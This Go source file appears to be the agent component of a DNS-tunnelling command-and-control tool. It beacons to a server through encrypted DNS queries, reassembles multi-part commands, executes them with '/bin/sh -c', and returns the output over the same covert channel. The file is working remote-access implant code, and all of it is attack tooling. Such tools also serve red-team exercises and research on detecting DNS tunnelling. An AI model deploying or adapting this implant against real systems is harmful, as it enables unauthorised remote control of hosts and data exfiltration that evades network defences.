package agent

import (
	"bytes"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/miekg/dns"
	"github.com/mosajjal/dnspot/c2"
	"github.com/mosajjal/dnspot/cryptography"
)

type Agent struct {
	CommandTimeout        time.Duration
	PrivateKeyBase36      string
	privateKey            *cryptography.PrivateKey
	ServerAddress         string
	ServerPublicKeyBase36 string
	serverPublicKey       *cryptography.PublicKey
	DnsSuffix             string
	io                    IO
	r                     runtime
}

// loglevel constants
const (
	DEBUG = uint8(iota)
	INFO
	WARN
	ERR
	FATAL
)

type IO interface {
	Logger(level uint8, format string, args ...interface{})
	GetInputFeed() chan string
	GetOutputFeed() chan string
}

// this is where all the multi-part packets will live. The key is parentPartID
// var PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)

type runtime struct {
	PacketBuffersWithSignature map[int][]c2.MessagePacketWithSignature
	LastAckFromServer          uint32
	NextMessageType            c2.MsgType
	NextPayload                []byte
	CurretBatchParentID        uint16
	HealthCheckInterval        time.Duration
	MessageTicker              *time.Ticker
}

func (a *Agent) reset() {
	a.r.NextMessageType = c2.MessageHealthcheck
	a.r.NextPayload = []byte{}
}

func (a *Agent) runCommand(command string, cmdType c2.CmdType, timestamp uint32) {
	switch cmdType {
	case c2.CommandExec:
		a.io.Logger(INFO, "running command: %s", command)

		// Create a new context and add a timeout to it
		ctx, cancel := context.WithTimeout(context.Background(), a.CommandTimeout)
		defer cancel() // The cancel should be deferred so resources are cleaned up

		cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)

		out, err := cmd.CombinedOutput()
		a.r.NextMessageType = c2.MessageExecuteCommandResponse
		a.r.NextPayload = out
		if err != nil {
			a.io.Logger(WARN, "Error in running command %s: %s", cmd, err)
			cancel()
		}
	case c2.CommandEcho:
		a.io.GetOutputFeed() <- fmt.Sprintf("[SERVER AT %v]: %s", time.Unix(int64(timestamp), 0), command)
		a.r.NextMessageType = c2.MessageExecuteCommandResponse
		a.r.NextPayload = []byte("msg delivered")
	}
}

func (a *Agent) grabFullPayload(packets []c2.MessagePacketWithSignature) ([]byte, error) {
	fullPayload := make([]byte, 0)
	packets = c2.CheckMessageIntegrity(packets)
	for _, packet := range packets {
		packetPayload := packet.Msg.Payload[:]
		fullPayload = append(fullPayload, packetPayload...)
	}
	// todo: clean the memory for this parentpartID
	delete(a.r.PacketBuffersWithSignature, int(packets[0].Msg.ParentPartID))
	// todo: how do we acknowledge that we're done here and we both go back to healthcheck?
	return bytes.Trim(fullPayload, "\x00"), nil

}

func (a *Agent) handleServerCommand(msgList []c2.MessagePacketWithSignature) error {
	if len(msgList) == 0 {
		return errors.New("incoming message is empty")
	}
	command := msgList[0] // todo: handle multiple commands at the same time?
	a.r.LastAckFromServer = command.Msg.TimeStamp
	a.io.Logger(DEBUG, "got message from Server: Type: %v, Payload: %s", command.Msg.MessageType, command.Msg.Payload)

	// execution for last/single packets
	switch msgType := command.Msg.MessageType; msgType {
	case c2.MessageHealthcheck:
		return nil // nothing to do. server wants us to remain in healthcheck mode
	case c2.MessageExecuteCommand:
		a.r.NextMessageType = msgType

		a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)] = append(a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)], command)
		// handle multipart packets here
		if command.Msg.ParentPartID != 0 { // multi part
			//fist and middle packets
			msg := c2.MessagePacket{
				TimeStamp:    uint32(time.Now().Unix()),
				MessageType:  a.r.NextMessageType,
				ParentPartID: command.Msg.ParentPartID,
				PartID:       command.Msg.PartID,
			}
			if command.Msg.IsLastPart {
				msg.IsLastPart = true
				a.r.NextMessageType = c2.MessageHealthcheck
			}
			payload := []byte("Ack!")
			// Config.io.Logger(INFO,"sending plyload %#v\n", msg)
			// time.Sleep(2 * time.Second)
			Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DnsSuffix, a.privateKey, a.serverPublicKey)
			for _, Q := range Questions {
				err = a.SendQuestionToServer(Q)
				if err != nil {
					a.io.Logger(INFO, "Error sending Message to Server: %s", err)
				}
			}
			if err != nil {
				a.io.Logger(WARN, "Error sending Message to Server: %s", err)
			}
			if !command.Msg.IsLastPart {
				return nil
			}
		}
		fullPayload, err := a.grabFullPayload(a.r.PacketBuffersWithSignature[int(command.Msg.ParentPartID)])
		if err != nil {
			a.io.Logger(WARN, "error grabbing full payload: %s", err)
		}
		a.runCommand(string(fullPayload), command.Msg.Command, command.Msg.TimeStamp)
		// aStatus.NextMessageType = c2.MessageHealthcheck
		// runCommand(PacketBuffersWithSignature[int(command.Msg.ParentPartID)])

	case c2.MessageExecuteCommandResponse:
		if command.Msg.IsLastPart || command.Msg.ParentPartID == 0 {
			a.io.Logger(DEBUG, "got last part of command response")
			a.reset()
		}
		return nil
	case c2.MessageSetHealthInterval:
		a.io.Logger(INFO, "Received command to explicitly set the healthcheck interval in milliseconds")
		// the time interval is packed in the lower 4 bytes of the message
		a.r.HealthCheckInterval = time.Duration(binary.BigEndian.Uint32(command.Msg.Payload[0:4])) * time.Millisecond
		a.r.MessageTicker = time.NewTicker(time.Duration(a.r.HealthCheckInterval) * time.Millisecond)
		return nil
	case c2.MessageSyncTime:
		// throwing a warning for out of sync time for now
		a.io.Logger(WARN, "Time is out of Sync.. not touching system time but please go and fix it!")
		a.io.Logger(WARN, "UTC time coming from the server: %s", command.Msg.Payload)
		return nil
	}

	return nil
}

// SendMessageToServer is the mirror of SendMessageToAgent on agent's side.
// it allows the agent to send arbitrary messeges to the server. At the moment
// this will not disrupt the flow of healthcheck messages coming from the agent
// and those message should be dismissed on the server side during this transmission
func (a *Agent) SendMessageToServer(msg string) {
	a.io.Logger(INFO, "sending message to server")
	a.r.NextMessageType = c2.MessageExecuteCommandResponse
	a.r.NextPayload = []byte(msg)
}

func (a *Agent) SendQuestionToServer(Q string) error {
	if len(Q) < 255 {
		// todo: implement retry here
		// todo: handle response form server
		response, err := c2.PerformExternalAQuery(Q, a.ServerAddress)
		if err != nil {
			return fmt.Errorf("failed to send the payload: %s", err)
		}
		msgList, skip, err := c2.DecryptIncomingPacket(response, a.DnsSuffix, a.privateKey, a.serverPublicKey)
		if err != nil && !skip {
			return fmt.Errorf("error in decrypting incoming packet from server: %s", err)
		} else if !skip {
			return a.handleServerCommand(msgList)
		}
	} else {
		return fmt.Errorf("query is too big %d, can't send this", len(Q))
	}
	return nil
}

func (a *Agent) sendHealthCheck() error {
	msg := c2.MessagePacket{
		TimeStamp:   uint32(time.Now().Unix()),
		MessageType: a.r.NextMessageType,
	}
	// set payload based on next message type?
	payload := []byte("Ping!")
	Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DnsSuffix, a.privateKey, a.serverPublicKey)
	if err != nil {
		a.io.Logger(WARN, "Error sending Message to Server: %s", err)
	}
	for _, Q := range Questions {
		err = a.SendQuestionToServer(Q)
		if err != nil {
			a.io.Logger(WARN, "Error sending Healthcheck: %s", err)
		}
	}
	return nil
}

func (a *Agent) Run(serverIo IO) {
	a.r.PacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)
	a.io = serverIo
	if a.ServerAddress == "" {
		systemDNS, _ := dns.ClientConfigFromFile("/etc/resolv.conf")
		if len(systemDNS.Servers) < 1 {
			a.io.Logger(FATAL, "could not determine OS's default resolver. Please manually specify a DNS server")
		}
		a.ServerAddress = systemDNS.Servers[0] + ":53"
	}

	a.io.Logger(INFO, "Starting a...")

	// for start, we'll do a healthcheck every 10 second, and will wait for server to change this for us
	a.r.HealthCheckInterval = 3 * time.Second //todo:make this into a config parameter
	a.r.NextMessageType = c2.MessageHealthcheck
	a.r.MessageTicker = time.NewTicker(a.r.HealthCheckInterval)

	if !strings.HasSuffix(a.DnsSuffix, ".") {
		a.DnsSuffix = a.DnsSuffix + "."
	}
	if !strings.HasPrefix(a.DnsSuffix, ".") {
		a.DnsSuffix = "." + a.DnsSuffix
	}

	var err error
	// generate a new private key if the user hasn't provided one
	if a.privateKey == nil {
		a.io.Logger(INFO, "generating a new key pair for the a since it was not specified")
		if a.privateKey, err = cryptography.GenerateKey(); err != nil {
			a.io.Logger(FATAL, "failed to generate a key for client")
		}
	} else {
		if a.privateKey, err = cryptography.PrivateKeyFromString(a.PrivateKeyBase36); err != nil {
			a.io.Logger(FATAL, "failed to generate a key for client")
		}
	}

	// extract the public key from the provided Base32 encoded string
	if a.serverPublicKey, err = cryptography.PublicKeyFromString(a.ServerPublicKeyBase36); err != nil {
		a.io.Logger(FATAL, "failed to generate a key for client")
	}

	// start the a by sending a healthcheck
	if err := a.sendHealthCheck(); err != nil {
		a.io.Logger(WARN, "%s", err)
	}

	go func() {
		for {
			select {
			case <-a.r.MessageTicker.C:
				if a.r.NextMessageType == c2.MessageHealthcheck {
					if err := a.sendHealthCheck(); err != nil {
						a.io.Logger(WARN, "%s", err)
					}
				}
				if a.r.NextMessageType == c2.MessageExecuteCommandResponse {
					msg := c2.MessagePacket{
						TimeStamp:   uint32(time.Now().Unix()),
						MessageType: a.r.NextMessageType,
					}
					payload := []byte(a.r.NextPayload)
					Questions, _, err := c2.PreparePartitionedPayload(msg, payload, a.DnsSuffix, a.privateKey, a.serverPublicKey)
					if err != nil {
						a.io.Logger(WARN, "Error sending Message to Server 1") //todo:update msg
					}
					for _, Q := range Questions {
						err = a.SendQuestionToServer(Q)
						if err != nil {
							a.io.Logger(INFO, "Error sending Message to Server 2: %s", err) //todo:update msg
						}
					}
				}
				// function to handle response coming from the server and update the status accordingly
				// handleServerResponse(response)
			case text := <-a.io.GetInputFeed():
				a.SendMessageToServer(text)
			}
		}
	}()
}
